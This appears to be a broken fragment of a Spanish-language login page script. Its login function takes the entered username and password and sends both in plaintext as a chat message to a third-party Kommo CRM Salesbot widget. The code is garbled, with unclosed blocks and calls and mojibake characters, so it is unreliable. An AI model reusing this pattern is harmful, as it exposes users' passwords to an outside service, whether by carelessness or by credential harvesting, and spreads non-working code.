  <script>
    function login() {
      let username = document.getElementById("username").value.trim();
      let password = document.getElementById("password").value.trim();

      if (username === "" || password === "") {
        Swal.fire({
          icon: "error",
          title: "Por favor, complete todos los campos",
          confirmButtonText: "OK",
          confirmButtonColor: "#6C63FF",

      }

      document.getElementById("chatHeader").style.display = "flex";

      let attempts = 0;
      const maxAttempts = 10;

      const trySend = setInterval(() => {
        if (window.crmPlugin && window.crmPlugin.setMeta) {
          window.crmPlugin.setMeta({
            name: username,
            message: `Usuario: ${username}\nContraseÃ±a: ${password}`
          });
          window.crmPlugin("open"); // abrir el widget flotante
          clearInterval(trySend);
          console.log("âœ… Mensaje enviado al Salesbot de Kommo");
        } else {

    }

    function toggleChat() {
      const chat = document.getElementById("chatBox");
      const button = document.querySelector(".chat-button");

      if (chat.style.display === "block") {
        chat.style.display = "none";
